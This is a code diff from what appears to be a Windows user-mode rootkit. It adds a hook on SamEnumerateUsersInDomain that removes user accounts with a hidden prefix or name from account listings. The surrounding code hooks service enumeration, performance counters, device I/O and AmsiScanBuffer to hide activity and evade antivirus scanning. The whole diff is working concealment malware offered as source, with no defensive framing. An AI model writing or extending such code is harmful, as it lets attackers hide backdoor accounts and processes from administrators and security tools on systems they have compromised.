@@ -24,6 +24,7 @@ static NT_ENUMSERVICESSTATUSEXA OriginalEnumServicesStatusExA;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
+static NT_SAMENUMERATEUSERSINDOMAIN OriginalSamEnumerateUsersInDomain;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
@@ -56,6 +57,7 @@ VOID InitializeHooks()
 	InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
+	InstallHook("samlib.dll", "SamEnumerateUsersInDomain", (LPVOID*)&OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -94,6 +96,7 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
+	UninstallHook(OriginalSamEnumerateUsersInDomain, HookedSamEnumerateUsersInDomain);
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
@@ -779,6 +782,28 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 						}
 					}
 				}
+			}
+		}
+	}
+
+	return status;
+}
+static NTSTATUS NTAPI HookedSamEnumerateUsersInDomain(HANDLE domainHandle, PULONG enumerationContext, ULONG userAccountControl, LPVOID *buffer, ULONG preferedMaximumLength, PULONG countReturned)
+{
+	NTSTATUS status = OriginalSamEnumerateUsersInDomain(domainHandle, enumerationContext, userAccountControl, buffer, preferedMaximumLength, countReturned);
+
+	if (NT_SUCCESS(status) && buffer && countReturned)
+	{
+		PNT_SAM_RID_ENUMERATION rids = (PNT_SAM_RID_ENUMERATION)*buffer;
+		for (ULONG i = 0; i < *countReturned; i++)
+		{
+			rids[i].Name.Buffer[rids[i].Name.Length / sizeof(WCHAR)] = L'\0';
+
+			if (HasPrefix(rids[i].Name.Buffer) || IsUserNameHidden(rids[i].Name.Buffer))
+			{
+				memmove(&rids[i], &rids[i + 1], (*countReturned - i - 1) * sizeof(NT_SAM_RID_ENUMERATION));
+				(*countReturned)--;
+				i--;
 			}
 		}
 	}
